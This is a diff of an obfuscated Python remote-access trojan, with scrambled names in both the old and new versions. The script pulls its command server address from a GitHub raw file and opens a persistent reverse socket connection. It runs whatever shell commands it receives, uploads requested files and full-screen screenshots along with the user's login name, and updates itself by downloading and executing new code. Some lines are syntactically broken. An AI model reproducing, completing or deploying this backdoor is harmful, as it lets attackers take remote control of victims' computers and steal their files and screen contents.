@@ -1,102 +1,98 @@
 import sys,subprocess,socket,time,requests
 from PIL import ImageGrab
-WPEjpRLCkKyCctrD = "04.12.24.8"
-dIRIHAmbtoLzfLMrOpC = ""
-aDqSdYrXtFmMA = ""
-oIHCYIlnpeJvwPIbJGo = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
-CyqBizVWSfQQhgYTCfvFO = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
-XvLrNOADK = "!"
-def yopYzadzlKfajWDonVs(host, port):
+RKHSHCQLUbTdekzG = "04.12.24.9"
+TwEYlbCH = ""
+YRGrTOygFOPuOkOtURFV = ""
+qLsErifDLbXaw = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
+pCqlaVbxozloUvZyMZyTFK = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
+TWrxZxzjgWngCPd = "!"
+def HgLGXhSQjSeWeDcKafShnwz(host, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((host, port))
 	return s
-def oikgZzboLtc(s):
-	CvdMAHlLKhcjlHdfybD = s.recv(1024)
-	if len(CvdMAHlLKhcjlHdfybD)==0:
+def kkpzXBiYadKhw(s):
+	CEGRRGxaR = s.recv(1024)
+	if len(CEGRRGxaR)==0:
 		return True
-	gRXpESeCm = CvdMAHlLKhcjlHdfybD.decode("utf-8")
-	if not gRXpESeCm.startswith(XvLrNOADK):
-		proc = subprocess.run(CvdMAHlLKhcjlHdfybD.decode("utf-8"), shell=True, capture_output=True)
+	fwQdXtYnmODwLMqyyeJqmMV = CEGRRGxaR.decode("utf-8")
+	if not fwQdXtYnmODwLMqyyeJqmMV.startswith(TWrxZxzjgWngCPd):
+		proc = subprocess.run(fwQdXtYnmODwLMqyyeJqmMV, shell=True, capture_output=True)
 		result = proc.stdout + proc.stderr
 		s.send(result)
 		return
-	ENgYQAkguhfYHPUbZ = gRXpESeCm.split(" ")[0][1:]
-	if ENgYQAkguhfYHPUbZ == "download":
-		lwwoFKi(s, gRXpESeCm)
-	elif ENgYQAkguhfYHPUbZ == "screenshot":
-		jFzLZtXdDqpdAMWZbOTV(s)
-	elif ENgYQAkguhfYHPUbZ == "doUXyzaIPq":
-		s.send(bytes(WPEjpRLCkKyCctrD, "utf-8"))
-def lwwoFKi(s, gRXpESeCm):
-	EGvasDBdeVBFnEJSKiL = gRXpESeCm.replace(XvLrNOADK+"download ","").split(",")
+	UFuBvsvDGvtvp = fwQdXtYnmODwLMqyyeJqmMV.split(" ")[0][1:]
+	if UFuBvsvDGvtvp == "download":
+		rFNaaiSouMSV(s, fwQdXtYnmODwLMqyyeJqmMV)
+	elif UFuBvsvDGvtvp == "screenshot":
+		kxFBNLVOeqmEnSyqPFl(s)
+def rFNaaiSouMSV(s, fwQdXtYnmODwLMqyyeJqmMV):
+	GHgqDNLgpLKrPeGXqrEszh = fwQdXtYnmODwLMqyyeJqmMV.replace(TWrxZxzjgWngCPd+"download ","").split(",")
 	results = []
-	for f in EGvasDBdeVBFnEJSKiL:
-		results += UABuWnDFATKyQCeA(f, "api/file/", { "type":os.path.splitext(f)[1] })
-	if results == []:
-		s.send(b"[+]
+	for f in GHgqDNLgpLKrPeGXqrEszh:
+		results += gejpzgPDgEOGnqlicyzof(f, "api/file/", { "type":os.path.splitext(f)[1] })
 	s.send(bytes("\n".join(results), "utf-8"))
-def jFzLZtXdDqpdAMWZbOTV(gRXpESeCm):
-	jDICTCthqdGxXKVV = ImageGrab.grab(
+def kxFBNLVOeqmEnSyqPFl(fwQdXtYnmODwLMqyyeJqmMV):
+	cZXVckiRIRvYEfoLsiaZO = ImageGrab.grab(
 		bbox=None,
 		include_layered_windows=False,
 		all_screens=True,
 		xdisplay=None
 	)
 	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
-	jDICTCthqdGxXKVV.save(fpath)
-	jDICTCthqdGxXKVV.close()
-	r = UABuWnDFATKyQCeA(fpath, "api/sscap")
+	cZXVckiRIRvYEfoLsiaZO.save(fpath)
+	cZXVckiRIRvYEfoLsiaZO.close()
+	r = gejpzgPDgEOGnqlicyzof(fpath, "api/sscap")
 	os.remove(fpath)
 	s.send(r)
-def UABuWnDFATKyQCeA(QIEkpLCrCnSSLauMtqb, DbNoSbcmbLvx, GJduCurc=None):
-	if not os.path.exists(QIEkpLCrCnSSLauMtqb):
-		return "[!] NOT FOUND: "+QIEkpLCrCnSSLauMtqb+"\n"
+def gejpzgPDgEOGnqlicyzof(alUSCXMETvNZkiRETBpShS, IclwoLZxC, BLemrKYVUPgrNvFqnOOlDv=None):
+	if not os.path.exists(alUSCXMETvNZkiRETBpShS):
+		return "[!] NOT FOUND: "+alUSCXMETvNZkiRETBpShS+"\n"
 	headers = {"user":os.getlogin()}
-	if GJduCurc is not None:
-		headers = {**headers, **GJduCurc}
-	requests.post(dIRIHAmbtoLzfLMrOpC+":"+aDqSdYrXtFmMA+"/"+DbNoSbcmbLvx,
-		files={open(QIEkpLCrCnSSLauMtqb, "rb")},
+	if BLemrKYVUPgrNvFqnOOlDv is not None:
+		headers = {**headers, **BLemrKYVUPgrNvFqnOOlDv}
+	requests.post(TwEYlbCH+":"+YRGrTOygFOPuOkOtURFV+"/"+IclwoLZxC,
+		files={open(alUSCXMETvNZkiRETBpShS, "rb")},
 		headers=headers)
-	return "[+] SUCCESS: "+QIEkpLCrCnSSLauMtqb+"\n"
-def BEcVkQVxTmAyrbMfAEfat():
-	if dIRIHAmbtoLzfLMrOpC == "" or aDqSdYrXtFmMA == "":
-		CvdMAHlLKhcjlHdfybD = requests.get(oIHCYIlnpeJvwPIbJGo).text.replace("\n","").split(":")
-		dIRIHAmbtoLzfLMrOpC = CvdMAHlLKhcjlHdfybD[0].strip()
-		aDqSdYrXtFmMA = CvdMAHlLKhcjlHdfybD[1].strip()
-		doUXyzaIPq = CvdMAHlLKhcjlHdfybD[2].strip()
-	return dIRIHAmbtoLzfLMrOpC, aDqSdYrXtFmMA, doUXyzaIPq
-def YAChSzQzkRi():
-	NKqMiMHwOSHhTRKB = os.path.basename(__file__)
-	fileType = NKqMiMHwOSHhTRKB.split(".")[-1]
-	uknoXqZWBO = NKqMiMHwOSHhTRKB.replace(fileType,"") +"."+WPEjpRLCkKyCctrD + fileType
-	efoKUnYsNr = os.path.join(os.path.getcwd(), uknoXqZWBO)
-	with open(uknoXqZWBO, "wb+") as f:
-		f.write(requests.get(CyqBizVWSfQQhgYTCfvFO+"/file"+efoKUnYsNr.split(".")[-1]))
+	return "[+] SUCCESS: "+alUSCXMETvNZkiRETBpShS+"\n"
+def hySihvLGkJnHyBucu():
+	if TwEYlbCH == "" or YRGrTOygFOPuOkOtURFV == "":
+		CEGRRGxaR = requests.get(qLsErifDLbXaw).text.replace("\n","").split(":")
+		TwEYlbCH = CEGRRGxaR[0].strip()
+		YRGrTOygFOPuOkOtURFV = CEGRRGxaR[1].strip()
+		trbGSfJJes = CEGRRGxaR[2].strip()
+	return TwEYlbCH, YRGrTOygFOPuOkOtURFV, trbGSfJJes
+def igQJzUtiAz():
+	cLGmBGPau = os.path.basename(__file__)
+	fileType = cLGmBGPau.split(".")[-1]
+	pmuolSzzLaT = cLGmBGPau.replace(fileType,"") +"."+RKHSHCQLUbTdekzG + fileType
+	nuNttSgNF = os.path.join(os.path.getcwd(), pmuolSzzLaT)
+	with open(pmuolSzzLaT, "wb+") as f:
+		f.write(requests.get(pCqlaVbxozloUvZyMZyTFK+"/file"+nuNttSgNF.split(".")[-1]))
 	if fileType == ".exe":
-		os.system(".\"+efoKUnYsNr)
+		os.system(".\"+nuNttSgNF)
 	elif fileType == ".pyw":
-		os.system("python "+efoKUnYsNr")
-def KBYAPgfE():
+		os.system("python "+nuNttSgNF")
+def pGLYXpqgiTjSpZNgZTJ():
 	pass
-def RxLncggjLizwoaxSODlVTS():
-	h, p, v = BEcVkQVxTmAyrbMfAEfat()
-	if WPEjpRLCkKyCctrD != v:
-		YAChSzQzkRi()
-	KBYAPgfE()
-	xmmsObpeNqgFOT = bytes("["+WPEjpRLCkKyCctrD+"] - "+os.getlogin()+" >> ", "utf-8")
+def hqSgesGrqfBqalcSLjQ():
+	h, p, v = hySihvLGkJnHyBucu()
+	if RKHSHCQLUbTdekzG != v:
+		igQJzUtiAz()
+	pGLYXpqgiTjSpZNgZTJ()
+	DTxaZeUAHfKbZzVJVLEz = bytes("["+RKHSHCQLUbTdekzG+"] - "+os.getlogin()+" >> ", "utf-8")
 	while True:
 		try:
 			while True:
-				aIqlrCpXpEIBq=False
+				rEItVvuJoGXXDUCO=False
 				try:
-					s=yopYzadzlKfajWDonVs(h, p)
-					while not aIqlrCpXpEIBq:
-						s.send(xmmsObpeNqgFOT)
-						aIqlrCpXpEIBq=oikgZzboLtc(s)
+					s=HgLGXhSQjSeWeDcKafShnwz(h, p)
+					while not rEItVvuJoGXXDUCO:
+						s.send(DTxaZeUAHfKbZzVJVLEz)
+						rEItVvuJoGXXDUCO=kkpzXBiYadKhw(s)
 					s.close()
 				except:
 					pass
 				time.sleep(5)
 		except:
 			time.sleep(5)
-sys.exit(RxLncggjLizwoaxSODlVTS())
+sys.exit(hqSgesGrqfBqalcSLjQ())
